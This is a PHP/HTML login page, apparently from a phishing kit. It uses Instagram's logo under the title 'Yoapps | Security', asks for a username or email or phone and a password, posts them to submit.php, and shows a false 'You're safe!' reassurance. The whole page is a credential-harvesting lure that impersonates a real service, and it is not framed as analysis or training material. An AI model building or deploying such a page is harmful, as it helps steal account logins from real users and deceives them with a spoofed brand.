<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8" name="viewport" content="width=device-width,initial-scale=1">
    <title>Yoapps | Security</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"> <!-- Bootstrap CDN-->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script> <!--Bootstrap CDN-->
    <link rel="icon" sizes="192x192" href="http://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"> <!-- Bootstrap CDN-->
  </head>
  <body>
    <header><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="img-fluid" style="border: none;"></header>
    <div class="container">
<?php
if (isset($_GET['login'])) {
  if ($_GET['login'] == 'error') {
    echo"<div class='alert alert-warning'>Username or Password are wrong! Please try again.</div>";
  }

} elseif (isset($_GET['status'])) {
  if($_GET['status'] == 'safe') {
    echo"<div class='alert alert-success'>You're safe! You don't need to change your password.</div>";
  }
} ?>
      <form class="form-group" action="submit.php" method="POST">
    <fieldset><legend><span class="col-xs-4 "><kbd>Enter your crendentials to continue</kbd></legend><input type="text" required autocomplete="off" class="form-control" name="uid" placeholder="Username or email or phone" /><br />
    <input type="password" required autocomplete="off" name="pwd" class="form-control" placeholder="Password"><br />
    <input type="submit" value="Login" name="submit" class="form-control btn btn-primary"/>
  </fieldset></form></div>
  </body>
</html>
